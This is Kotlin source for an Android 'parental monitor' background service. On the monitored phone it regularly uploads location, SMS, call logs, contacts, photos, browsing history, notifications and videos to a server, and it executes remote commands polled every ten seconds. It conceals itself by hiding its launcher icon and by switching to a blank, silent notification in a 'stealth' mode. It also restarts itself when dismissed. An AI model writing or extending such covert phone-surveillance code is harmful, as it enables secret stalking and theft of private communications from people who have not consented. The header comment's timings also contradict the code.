package com.parentalmonitor.child.services

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.parentalmonitor.child.core.AppConstants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * Persistent foreground service.
 *
 * Tick every 5 minutes:
 *   → Location + device status (every tick)
 *   → Remote commands poll (every tick)
 *   → Geofence + app-block rule sync (every tick)
 *
 * Slower tick every 30 minutes (6 × 5-min cycles):
 *   → Call logs, contacts, gallery, browsing history
 */
class TrackingForegroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private lateinit var locationSvc:      LocationService
    private lateinit var deviceSvc:        DeviceService
    private lateinit var commandSvc:       RemoteCommandService
    private lateinit var notificationSvc:  NotificationSyncService
    private lateinit var videoUploadSvc:   VideoUploadService
    private lateinit var smsSvc:           SmsService
    private lateinit var callLogSvc:       CallLogService
    private lateinit var contactsSvc:      ContactsService
    private lateinit var gallerySvc:       GalleryService
    private lateinit var browsingHistSvc:  BrowsingHistoryService

    private var slowTick = 0

    override fun onCreate() {
        super.onCreate()
        locationSvc     = LocationService(this)
        deviceSvc       = DeviceService(this)
        commandSvc      = RemoteCommandService(this, AppConstants.backendBaseUrl)
        notificationSvc = NotificationSyncService(this, AppConstants.backendBaseUrl)
        videoUploadSvc  = VideoUploadService(this, AppConstants.backendBaseUrl)
        smsSvc          = SmsService(this, AppConstants.backendBaseUrl)
        callLogSvc      = CallLogService(this)
        contactsSvc     = ContactsService(this)
        gallerySvc      = GalleryService(this)
        browsingHistSvc = BrowsingHistoryService(this)
        isRunning       = true
        clearDpmCameraPolicy()
        migrateLauncherHide()
    }

    // On non-Samsung devices, switch from old package-level disable (breaks camera) to
    // component-level LauncherAlias disable (icon hidden, package stays enabled).
    private fun migrateLauncherHide() {
        if (android.os.Build.MANUFACTURER.equals("samsung", ignoreCase = true)) return
        val pm = packageManager
        if (pm.getApplicationEnabledSetting(packageName) ==
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            android.util.Log.i(TAG, "Migrating icon-hide: re-enabling package, disabling LauncherAlias only")
            pm.setApplicationEnabledSetting(packageName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP)
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, "com.parentalmonitor.child.LauncherAlias"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP)
        }
    }

    // Samsung Knox automatically sets camera/screenshot restrictions when the app registers
    // as Device Owner via ADB. Clear ALL three blocking mechanisms on every service start.
    private fun clearDpmCameraPolicy() {
        try {
            val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
                ?: return
            if (!dpm.isDeviceOwnerApp(packageName)) return
            val admin = android.content.ComponentName(
                this, com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java)
            val um = getSystemService(android.os.UserManager::class.java) ?: return

            if (dpm.getCameraDisabled(null)) {
                dpm.setCameraDisabled(admin, false)
                android.util.Log.i(TAG, "Startup: cleared DPM setCameraDisabled policy")
            }
            if (um.hasUserRestriction("no_camera")) {
                dpm.clearUserRestriction(admin, "no_camera")
                android.util.Log.i(TAG, "Startup: cleared DISALLOW_CAMERA user restriction")
            }
            if (um.hasUserRestriction("no_screenshots")) {
                dpm.clearUserRestriction(admin, "no_screenshots")
                android.util.Log.i(TAG, "Startup: cleared DISALLOW_SCREENSHOT user restriction")
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "clearDpmCameraPolicy: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val fgsType = if (hasLocationPermission())
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        else
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC

        if (intent?.action == ACTION_STEALTH) {
            // Switch to silent channel (no status-bar icon, no shade sound)
            createSilentNotificationChannel()
            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildSilentNotification(), fgsType)
            return START_STICKY
        }

        createNotificationChannel()
        ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), fgsType)
        startLoop()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning = false
        scope.cancel()
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        scheduleRestart()
        super.onTaskRemoved(rootIntent)
    }

    // ── Main capture loop ─────────────────────────────────────────────────────

    private fun startLoop() {
        // Fast command loop — lightweight, runs every 10 s
        scope.launch {
            while (isActive) {
                runCommandPoll()
                delay(COMMAND_INTERVAL_MS)
            }
        }

        // Data loop — location/status/sync, runs every 60 s
        scope.launch {
            while (isActive) {
                runDataCapture()

                slowTick++
                if (slowTick >= SLOW_EVERY_N_TICKS) {
                    slowTick = 0
                    runSlowCapture()
                }

                delay(FAST_INTERVAL_MS)
            }
        }
    }

    /** Runs every 10 s — ONLY remote commands (fast, lightweight) */
    private suspend fun runCommandPoll() {
        val (token, deviceId) = readAuth()
        if (token != null && deviceId != null) {
            safeRun { commandSvc.pollAndExecute(token, deviceId) }
        }
    }

    /** Runs every 60 s — location, device status, sync rules, SMS */
    private suspend fun runDataCapture() {
        safeRun { locationSvc.captureLocation() }
        safeRun { deviceSvc.captureStatus() }

        val (token, deviceId) = readAuth()
        if (token != null && deviceId != null) {
            safeRun { commandSvc.syncGeofences(token, deviceId) }
            safeRun { commandSvc.syncAppBlocks(token, deviceId) }
            safeRun { notificationSvc.uploadPending(token, deviceId) }
            safeRun { smsSvc.syncSms(token, deviceId) }
        }
    }

    /** Runs every ~6 minutes — heavier content providers, all native Kotlin (no Flutter needed). */
    private fun runSlowCapture() {
        android.util.Log.i(TAG, "── Slow cycle: starting native data sync ──")

        // Signal Flutter's MonitoringService in case Flutter is in the foreground.
        getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
            .edit()
            .putLong("flutter.$KEY_SLOW_CYCLE_TS", System.currentTimeMillis())
            .apply()

        val (token, deviceId) = readAuth()
        if (token == null || deviceId == null) {
            android.util.Log.w(TAG, "Slow cycle SKIP — no auth token/deviceId in SharedPreferences")
            return
        }
        android.util.Log.d(TAG, "Slow cycle syncing for device $deviceId")

        safeRun { locationSvc.syncLocation(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { smsSvc.syncSms(token, deviceId) }
        safeRun { callLogSvc.syncCallLogs(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { contactsSvc.syncContacts(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { gallerySvc.syncGallery(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { browsingHistSvc.syncBrowsingHistory(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { videoUploadSvc.uploadPendingVideos(token, deviceId) }

        android.util.Log.i(TAG, "── Slow cycle: done ──")
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "ParentGard", NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createSilentNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_SILENT_ID, "ParentGard Background", NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("ParentGard")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()

    private fun buildSilentNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_SILENT_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()

    // ── Restart insurance ─────────────────────────────────────────────────────

    private fun scheduleRestart() {
        val restartIntent = PendingIntent.getService(
            this, 1,
            Intent(applicationContext, TrackingForegroundService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE,
        )
        (getSystemService(ALARM_SERVICE) as AlarmManager).set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1_000L,
            restartIntent,
        )
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private fun readAuth(): Pair<String?, String?> {
        val prefs  = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
        val token  = prefs.getString("flutter.pm_token", null)
        val devId  = prefs.getString("flutter.pm_device_id", null)
        return Pair(token, devId)
    }

    private fun hasLocationPermission(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private inline fun safeRun(block: () -> Unit) {
        try { block() } catch (_: Exception) {}
    }

    companion object {
        @Volatile var isRunning = false

        const val PREFS_TRACKING    = "pm_tracking"
        const val KEY_SLOW_CYCLE_TS = "slow_cycle_ts"
        const val ACTION_STEALTH    = "com.parentalmonitor.child.ACTION_STEALTH"

        private const val TAG                = "TrackingFgService"
        private const val CHANNEL_ID         = "pm_tracking_channel"
        private const val CHANNEL_SILENT_ID  = "pm_tracking_silent"
        private const val NOTIFICATION_ID    = 1001
        private const val COMMAND_INTERVAL_MS = 10 * 1_000L      // 10 s — command fast poll
        private const val FAST_INTERVAL_MS   = 60 * 1_000L      // 60 s — data capture
        private const val SLOW_EVERY_N_TICKS = 6                 // every 6 min
    }
}
